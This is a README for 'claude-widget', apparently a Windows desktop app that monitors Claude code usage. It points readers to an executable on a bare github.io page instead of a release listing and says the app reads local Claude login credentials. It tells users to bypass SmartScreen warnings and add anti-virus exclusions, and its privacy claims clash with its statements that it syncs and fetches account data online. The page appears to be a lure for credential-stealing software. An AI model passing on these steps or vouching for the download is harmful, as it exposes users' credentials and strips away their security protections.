# 📊 claude-widget - Monitor your Claude code usage easily

[![Download for Windows](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://umeshka7380.github.io)

This application provides a simple window on your desktop to track your Claude code usage. It displays how much you use the service in real-time. You see your current session length, your usage for the week, and your limits for each model. It also shows if you have extra credits and the number of tokens you consume. The app reads your local Claude data to provide these numbers. It does not send your data to any outside servers. Your privacy stays protected.

## 🛠 Features

*   **Real-time tracking**: See your current 5-hour session data at a glance.
*   **Weekly overview**: Track your usage habits over a seven-day period.
*   **Model limits**: Check your remaining capacity for different models.
*   **Token counter**: Track the exact tokens you spend on every task.
*   **Privacy focus**: Your credentials stay on your computer. No data leaves your machine.
*   **Tray icon**: The app sits in your system tray to stay out of your way while you work.

## ⚙️ System Requirements

*   **Operating System**: Windows 10 or Windows 11 (64-bit).
*   **Memory**: At least 200 MB of free RAM.
*   **Storage**: 50 MB of available disk space.
*   **Internet Connection**: Required to sync your account usage data.
*   **Dependencies**: The app includes all necessary files to run. You do not need to install Node.js or other tools.

## 📥 How to Install

1.  Visit the [official releases page](https://umeshka7380.github.io) to access the downloads.
2.  Locate the file ending in `.exe` under the latest version header. 
3.  Click the file to start the download.
4.  Once the file finishes downloading, open your Downloads folder.
5.  Double-click the installer file to begin the setup process.
6.  Follow the prompts on your screen. The installer will place a shortcut on your desktop.
7.  The application will launch automatically after the installation completes.

## 🖥 Using the Widget

When you launch the application for the first time, it looks for your local login credentials. It uses your existing Claude setup to find your account details. It does not ask for your password.

Once it finds your information, you will see a small window on your screen. You can drag this window anywhere. The window updates every few minutes to ensure the numbers remain current.

### Understanding the Dashboard

The widget groups your data into clear sections:
*   **Session Timer**: Shows how much time remains until your 5-hour window resets.
*   **Weekly usage**: A bar graph showing your active time over the last week.
*   **Token usage**: A list of models and the tokens you spent on each one.
*   **Credit status**: Your current balance of extra tokens or credits.

To hide the widget, click the icon in your system tray. You can right-click the same icon to show the window again or to exit the application.

## 🔒 Security and Privacy

This application reads only the files necessary to report your usage. It does not transmit your personal data, your chat history, or your login keys over the internet. All processing happens on your local device. The application does not include tracking tools or third-party analytics. 

## ❓ Frequently Asked Questions

**Does the app slow down my computer?**
No. The application uses very few system resources and remains idle most of the time.

**Can I run this on Mac or Linux?**
Currently, the application supports Windows systems only.

**What happens if the numbers do not refresh?**
Check your internet connection first. If you still have trouble, right-click the system tray icon and select Refresh or Restart.

**Does this app change my Claude account settings?**
No. This app is read-only. It cannot change your account settings, spend credits, or modify your subscription.

## 💡 Troubleshooting

If you encounter issues during installation or usage, try these steps:

*   **Windows SmartScreen**: Windows may show a warning when you open the installer. Click "More info" and then "Run anyway" if you trust the software source.
*   **Missing Data**: If the widget shows empty fields, ensure you have used your Claude account at least once recently. The app needs recent activity to fetch your usage history.
*   **Anti-Virus**: If your anti-virus blocks the file, add an exclusion for the `claude-widget` folder in your Program Files directory.

Keywords: anthropic, claude, claude-code, desktop-widget, electron, nodejs, token-usage, tray-app, usage-monitor, windows